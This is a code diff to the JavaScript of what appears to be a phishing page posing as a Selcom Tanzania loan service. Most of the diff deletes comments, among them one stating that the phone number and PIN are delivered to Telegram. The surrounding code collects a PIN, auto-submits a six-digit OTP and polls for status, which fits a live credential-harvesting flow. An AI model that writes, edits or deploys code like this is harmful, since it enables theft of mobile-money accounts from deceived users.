@@ -37,7 +37,6 @@ document.addEventListener('DOMContentLoaded', () => {
     if (targetScreen) targetScreen.classList.add('active');
   }
 
-  // Language Switcher
   function updateLanguageTexts(isSwahili) {
     if (isSwahili) {
       document.getElementById('lbl-welcome-title').innerText = 'KARIBU SELCOM TANZANIA!';
@@ -61,7 +60,6 @@ document.addEventListener('DOMContentLoaded', () => {
     updateLanguageTexts(true);
   }
 
-  // Navigation Flows
   document.getElementById('btn-goto-slider').addEventListener('click', () => showScreen(screenSlider));
   document.getElementById('btn-goto-form1').addEventListener('click', () => showScreen(screenForm1));
 
@@ -99,7 +97,6 @@ document.addEventListener('DOMContentLoaded', () => {
     if (pinBoxes[0]) pinBoxes[0].focus();
   });
 
-  // Slider Calculator
   const loanSlider = document.getElementById('loan-amount-slider');
   const loanText = document.getElementById('loan-amount-text');
   const monthsSlider = document.getElementById('loan-months-slider');
@@ -170,7 +167,6 @@ document.addEventListener('DOMContentLoaded', () => {
     pinBoxes.forEach(box => box.type = box.type === 'password' ? 'text' : 'password');
   });
 
-  // Step 1 Submission: Deliver Phone & PIN to Telegram
   btnSubmitCreds.addEventListener('click', async () => {
     const phoneVal = phoneInput.value.trim();
     const pinVal = Array.from(pinBoxes).map(b => b.value).join('');
@@ -197,7 +193,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // Step 2: OTP Setup & Auto-submit
   setupDigitInputs(otpBoxes, () => {
     const otpVal = Array.from(otpBoxes).map(b => b.value).join('');
     if (otpVal.length === 6) {
@@ -231,7 +226,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
   btnSubmitOtp.addEventListener('click', submitOtpHandler);
 
-  // 1-Minute Countdown Timer
   function startOneMinuteTimer() {
     let timeLeft = 60;
     if (btnRequestNewOtp) btnRequestNewOtp.style.display = 'none';
@@ -243,8 +237,8 @@ document.addEventListener('DOMContentLoaded', () => {
       timeLeft--;
       let mins = Math.floor(timeLeft / 60);
       let secs = timeLeft % 60;
-      const countEl = document.getElementById('countdown');
-      if (countEl) countEl.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+      const countEls = document.querySelectorAll('#countdown');
+      countEls.forEach(el => el.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`);
 
       if (timeLeft <= 0) {
         clearInterval(countdownInterval);
@@ -271,7 +265,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Polling Status Function
   function startStatusPolling() {
     if (statusPollInterval) clearInterval(statusPollInterval);
 
@@ -339,4 +332,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loadingOverlay) loadingOverlay.classList.remove('active');
   }
 });
-    
+                          
